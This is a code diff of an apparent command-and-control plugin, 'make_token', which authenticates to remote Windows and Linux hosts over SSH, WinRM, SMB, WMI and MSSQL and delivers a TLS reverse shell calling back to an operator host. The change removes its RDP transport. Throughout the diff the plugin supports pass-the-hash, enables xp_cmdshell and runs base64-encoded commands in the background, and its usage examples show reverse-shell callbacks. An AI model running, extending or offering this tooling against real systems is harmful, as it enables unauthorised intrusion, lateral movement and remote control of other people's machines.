@@ -1,4 +1,4 @@
-"""Cross-platform C2 token creation plugin supporting SSH, WinRM, SMB, and RDP using command-line tools.
+"""Cross-platform C2 token creation plugin supporting SSH, WinRM, SMB, WMI, and MSSQL using command-line tools.
 
 This plugin establishes connections to remote targets and delivers a reverse shell payload
 that connects back to the TornadoRevC2 reverse shell handler over TLS.
@@ -18,7 +18,7 @@ from typing import Dict, Optional, Tuple, Any, List, Union
 from ..api import plugin, SessionContext
 
 MAKE_TOKEN_USAGE = """
-make_token — Establish a C2 session via SSH, WinRM, SMB, RDP, WMI, or MSSQL,
+make_token — Establish a C2 session via SSH, WinRM, SMB, WMI, or MSSQL,
 and deliver a reverse shell payload (TLS) or a custom command.
 
 Usage:
@@ -32,24 +32,20 @@ Protocols & authentication:
   ssh        - password (-p) or private key (-c); Linux, macOS, or Windows
   winrm      - password (-p), NTLM hash (-H), or client cert (--cert-pfx); Windows only
   smb        - password (-p) or NTLM hash (-H); Windows via psexec, Linux via --nxc
-  rdp        - password (-p) or NTLM hash (-H); Windows and Linux.
-               Windows command execution uses xfreerdp /app:cmd.exe.
-               Linux/Unix uses xfreerdp /shell: (best-effort; xrdp does not
-               implement RemoteApp). Headless environments should use --nxc.
   wmi        - password (-p) or NTLM hash (-H); Windows only
   mssql      - password (-p) or NTLM hash (-H); Windows only (enables xp_cmdshell)
 
 Options:
-  -x, --protocol <proto>     Protocol to use (ssh, winrm, smb, rdp, wmi, mssql)
+  -x, --protocol <proto>     Protocol to use (ssh, winrm, smb, wmi, mssql)
   --os <os>                  Target OS: windows, linux, unix (linux and unix share the same payload)
   -i, --ip <ip>              Target IP address
-  -P, --port <port>          Custom port (defaults: ssh:22, winrm:5985, smb:445, rdp:3389, wmi:135, mssql:1433)
+  -P, --port <port>          Custom port (defaults: ssh:22, winrm:5985, smb:445, wmi:135, mssql:1433)
                              With --cert-pfx, winrm defaults to 5986 (HTTPS).
   -u, --username <user>      Username for authentication
   -p, --password <pass>      Password (use with -p, or -p for ssh)
   -c, --key <path>           SSH private key file (SSH only)
-  -H, --hash <ntlm_hash>     NTLM hash (SMB, RDP, WinRM, WMI, MSSQL)
-  --cert-pfx <path>          PFX file containing a client certificate + private key (WinRM only).
+  -H, --hash <ntlm_hash>     NTLM hash (SMB, WinRM, WMI, MSSQL)
+  --cert-pfx <full_path>     PFX file containing a client certificate + private key (WinRM only).
                              Enables passwordless authentication via the target's
                              Certificate ClientAuth thumbprint->user mapping.
                              Works with both evil-winrm (PEM extracted via openssl)
@@ -94,28 +90,24 @@ Examples:
   # SMB to Windows with psexec (no --nxc)
   run make_token -x smb --os windows -i 192.168.1.30 -u admin -p pass -rh 10.0.0.5 -rp 4444
 
-  # RDP to Windows with xfreerdp (requires a display; headless environments need --nxc)
-  run make_token -x rdp --os windows -i 192.168.1.40 -u user -p pass -rh 10.0.0.5 -rp 4444
+  # WMI to Windows (uses impacket wmiexec by default, or --nxc for netexec)
+  run make_token -x wmi --os windows -i 192.168.1.50 -u admin -p pass -rh 10.0.0.5 -rp 4444
 
-  # RDP with NTLM hash via xfreerdp (/pth:) — same display requirement
-  run make_token -x rdp --os windows -i 192.168.1.40 -u user -H <hash> -C "whoami"
+  # MSSQL to Windows (enables xp_cmdshell automatically)
+  run make_token -x mssql --os windows -i 192.168.1.60 -u sa -p pass -rh 10.0.0.5 -rp 4444
 
 Notes:
   - If -C is given, the custom command is base64‑encoded and executed with nohup (Linux) or Start‑Process (Windows),
     so it runs in the background and does not block the session.
-  - For Linux custom commands, ensure the target has base64, sh, and the necessary interpreters.
+  - For Linux custom commands, ensure the target has the necessary interpreters (e.g., sh, base64).
   - For Windows custom commands, PowerShell will be used to decode and execute.
   - Platform detection is informational only; the payload is chosen based on --os.
+  - SSH password authentication requires either plink (with ssh-keyscan) or sshpass installed locally.
   - WinRM certificate authentication requires:
       * A PFX whose cert has the clientAuth EKU (see winrm plugin: 'cert create-selfsigned --client')
       * The target configured via 'exploitcert' (public cert in TrustedPeople, thumbprint->user mapping)
       * The target's WinRM service running with Certificate auth enabled (HTTPS/5986)
-      * Either evil-winrm (PEM path) or netexec (native PFX path) installed locally
-  - RDP command execution:
-      * Windows targets use xfreerdp /app:cmd.exe — requires a display (X11, Wayland).
-      * Linux/Unix targets use /shell: — best-effort only; xrdp has no RemoteApp,
-        so this will usually fail. Prefer --nxc for Linux RDP.
-      * NTLM hash via /pth: is supported on both paths.
+      * Either evil-winrm (PEM path, requires openssl) or netexec (native PFX path) installed locally
 """.strip()
 
 PLUGIN_INFO = MAKE_TOKEN_USAGE
@@ -131,7 +123,6 @@ class RemoteTransport(ABC):
         'ssh': 22,
         'winrm': 5985,
         'smb': 445,
-        'rdp': 3389,
         'wmi': 135,
         'mssql': 1433,
     }
@@ -140,7 +131,6 @@ class RemoteTransport(ABC):
         'ssh': ['windows', 'linux', 'macos'],
         'winrm': ['windows'],
         'smb': ['windows', 'linux'],
-        'rdp': ['windows', 'linux'],
         'wmi': ['windows'],
         'mssql': ['windows'],
     }
@@ -1066,190 +1056,6 @@ class SMBTransport(RemoteTransport):
     def _perform_platform_detection(self) -> str:
         return self._target_os if self._target_os in ('windows', 'linux') else 'windows'
 
-
-class RDPTransport(RemoteTransport):
-    def __init__(self):
-        super().__init__()
-        self._xfreerdp_command = None
-        self._netexec_available = False
-
-    def _ensure_dependency(self):
-        self._netexec_available = self._check_command('netexec')
-        if self._check_command('xfreerdp3'):
-            self._xfreerdp_command = 'xfreerdp3'
-        elif self._check_command('xfreerdp'):
-            self._xfreerdp_command = 'xfreerdp'
-        else:
-            self._xfreerdp_command = None
-
-        if not (self._netexec_available or self._xfreerdp_command):
-            raise RemoteTransportError(
-                "RDP requires either 'netexec' (for command execution) or 'xfreerdp'/'xfreerdp3'. "
-                "Install netexec: pip install netexec, or freerdp: apt install freerdp3"
-            )
-
-    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
-        self._ensure_dependency()
-        if kwargs.get('private_key'):
-            raise RemoteTransportError("RDP does not support private key authentication")
-        ntlm_hash = kwargs.get('ntlm_hash')
-        use_nxc = kwargs.get('use_nxc', True)
-        port = kwargs.get('port')
-        if port is None:
-            port = self.DEFAULT_PORTS['rdp']
-        if not password and not ntlm_hash:
-            raise RemoteTransportError("Password or NTLM hash required for RDP")
-        self._host = host
-        self._username = username
-        self._password = password
-        self._ntlm_hash = ntlm_hash
-        self._target_os = kwargs.get('target_os')
-        self._callback_host = kwargs.get('callback_host')
-        self._callback_port = kwargs.get('callback_port')
-        self._port = port
-        self._use_nxc = use_nxc or not self._xfreerdp_command
-
-        if self._use_nxc:
-            return self._connect_nxc(host, username, password, ntlm_hash, port)
-        else:
-            return self._connect_xfreerdp(host, username, password, ntlm_hash, port)
-
-    def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
-                     ntlm_hash: Optional[str] = None, port: int = 3389) -> bool:
-        try:
-            cmd = ['netexec', 'rdp', host, '-u', username]
-            if port is not None and port != self.DEFAULT_PORTS['rdp']:
-                cmd.extend(['--port', str(port)])
-            if ntlm_hash:
-                cmd.extend(['-H', ntlm_hash])
-            elif password:
-                cmd.extend(['-p', password])
-            else:
-                raise RemoteTransportError("Password or NTLM hash required")
-            success, stdout, stderr = self._run_command(cmd, timeout=30)
-            output = stdout + stderr
-            if success or 'authenticated' in output.lower():
-                self.connected = True
-                return True
-            else:
-                raise RemoteTransportError(f"netexec RDP connection failed: {stderr.strip()}")
-        except RemoteTransportError:
-            raise
-        except Exception as e:
-            raise RemoteTransportError(f"netexec RDP connection failed: {e}")
-
-    def _connect_xfreerdp(self, host: str, username: str, password: Optional[str] = None,
-                          ntlm_hash: Optional[str] = None, port: int = 3389) -> bool:
-        if not password and not ntlm_hash:
-            raise RemoteTransportError("xfreerdp requires password or NTLM hash")
-        self.connected = True
-        return True
-
-    def _execute_xfreerdp_command(self, command: str, background: bool = False) -> Tuple[bool, str]:
-        if not self._xfreerdp_command:
-            return False, "xfreerdp not available"
-        if not self._password and not self._ntlm_hash:
-            return False, "xfreerdp requires password or NTLM hash"
-
-        cmd = [
-            self._xfreerdp_command,
-            '/v:' + self._host,
-            '/u:' + self._username,
-            '/cert-ignore',
-            '/timeout:10000',
-            '/network:lan',
-            '/gfx-h264:off',
-            '/gdi:sw',
-            '/exit-after-disconnect',
-        ]
-
-        if self._ntlm_hash:
-            cmd.append('/pth:' + self._ntlm_hash)
-        else:
-            cmd.append('/p:' + self._password)
-
-        if self._port is not None and self._port != self.DEFAULT_PORTS['rdp']:
-            cmd.append('/port:' + str(self._port))
-
-        if self._target_os == 'windows':
-            cmd.append('/app:cmd.exe')
-            cmd.append('/app-cmd:' + f'/c {command}')
-        elif self._target_os in ('linux', 'unix'):
-            cmd.append('/shell:' + command)
-        else:
-            return False, f"xfreerdp doesn't support target OS: {self._target_os}"
-
-        timeout = 10 if background else 60
-        success, stdout, stderr = self._run_command(cmd, timeout=timeout)
-        output = (stdout + stderr).lower()
-
-        if success:
-            return True, stdout
-        if 'could not open display' in output:
-            return False, "xfreerdp requires an X11/Wayland display. Use --nxc for headless environments."
-        if 'failed to connect' in output or 'connection refused' in output:
-            return False, f"xfreerdp connection failed: {(stderr or stdout).strip()}"
-        if 'logon failure' in output or 'authentication failure' in output:
-            return False, f"xfreerdp authentication failed: {(stderr or stdout).strip()}"
-        return False, f"xfreerdp command execution failed: {(stderr or stdout).strip()}"
-
-    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
-                        background: bool = False) -> Tuple[bool, str]:
-        if not self.connected:
-            return False, "Not connected"
-
-        target_os = target_os or self._target_os or 'windows'
-        if isinstance(command, dict):
-            command = self._get_os_specific_command(command, target_os)
-            if command is None:
-                return False, f"No command found for OS: {target_os}"
-
-        if self._netexec_available and self._use_nxc:
-            try:
-                cmd = ['netexec', 'rdp', self._host, '-u', self._username]
-                if self._ntlm_hash:
-                    cmd.extend(['-H', self._ntlm_hash])
-                elif self._password:
-                    cmd.extend(['-p', self._password])
-                else:
-                    return False, "No authentication available for netexec RDP"
-
-                if self._port is not None and self._port != self.DEFAULT_PORTS['rdp']:
-                    cmd.extend(['--port', str(self._port)])
-
-                if target_os == 'windows':
-                    cmd.extend(['-x', command])
-                else:
-                    cmd.extend(['-X', command])
-
-                timeout = 10 if background else 60
-                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
-
-                if success:
-                    return True, stdout
-                else:
-                    if 'unrecognized arguments' in stderr or 'invalid option' in stderr:
-                        self._netexec_available = False
-                    else:
-                        return False, stderr
-            except Exception:
-                pass
-
-        return self._execute_xfreerdp_command(command, background)
-
-    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
-        return self.execute_command(payload, target_os, background=True)
-
-    def close(self):
-        self.connected = False
-        self._host = self._username = self._password = self._target_os = None
-        self._port = None
-        self._ntlm_hash = None
-
-    def _perform_platform_detection(self) -> str:
-        return self._target_os if self._target_os in ('windows', 'linux') else 'unknown'
-
-
 class WMITransport(RemoteTransport):
     """WMI transport using wmiexec.py (impacket) or netexec/nxc."""
     
@@ -1682,7 +1488,6 @@ def get_transport(protocol: str) -> RemoteTransport:
         'ssh': SSHTransport,
         'winrm': WinRMTransport,
         'smb': SMBTransport,
-        'rdp': RDPTransport,
         'wmi': WMITransport,
         'mssql': MSSQLTransport,
     }
@@ -1707,7 +1512,7 @@ def parse_make_token_args(args: list) -> Dict[str, Any]:
         description='Make token - establish C2 session via remote protocol and deliver reverse shell payload (TLS)'
     )
     parser.add_argument('-x', '--protocol', required=True,
-                        choices=['ssh', 'winrm', 'smb', 'rdp', 'wmi', 'mssql'],
+                        choices=['ssh', 'winrm', 'smb', 'wmi', 'mssql'],
                         help='Remote protocol to use')
     parser.add_argument('--os', required=True,
                         choices=['windows', 'linux', 'unix'],
@@ -1717,7 +1522,7 @@ def parse_make_token_args(args: list) -> Dict[str, Any]:
     parser.add_argument('-u', '--username', required=True, help='Username for authentication')
     parser.add_argument('-p', '--password', help='Password for authentication')
     parser.add_argument('-c', '--key', help='SSH private key path (SSH only)')
-    parser.add_argument('-H', '--hash', help='NTLM hash for authentication (SMB/RDP/WinRM)')
+    parser.add_argument('-H', '--hash', help='NTLM hash for authentication (SMB/WinRM/WMI/MSSQL)')
     parser.add_argument('--cert-pfx', dest='cert_pfx',
                         help='PFX file with a client certificate (WinRM only, enables cert auth over HTTPS)')
     parser.add_argument('--cert-pass', dest='cert_pass', default='winrmbind',
@@ -1804,14 +1609,6 @@ def parse_make_token_args(args: list) -> Dict[str, Any]:
                 raise RemoteTransportError("--cert-pfx is only supported for the winrm protocol")
             if not parsed.password and not parsed.hash:
                 raise RemoteTransportError("SMB requires either -p (password) or -H (hash)")
-
-        elif parsed.protocol == 'rdp':
-            if parsed.key:
-                raise RemoteTransportError("RDP does not support private key")
-            if parsed.cert_pfx:
-                raise RemoteTransportError("--cert-pfx is only supported for the winrm protocol")
-            if not parsed.password and not parsed.hash:
-                raise RemoteTransportError("RDP requires either -p (password) or -H (hash)")
 
         elif parsed.protocol == 'wmi':
             if parsed.key:
@@ -1926,8 +1723,6 @@ def run(session: SessionContext, args):
             tool_info = " using default WinRM tool (evil-winrm or netexec)"
     elif protocol == 'smb':
         tool_info = " using netexec/impacket"
-    elif protocol == 'rdp':
-        tool_info = " using netexec/xfreerdp"
     elif protocol == 'wmi':
         tool_info = " using netexec/impacket-wmiexec"
     elif protocol == 'mssql':
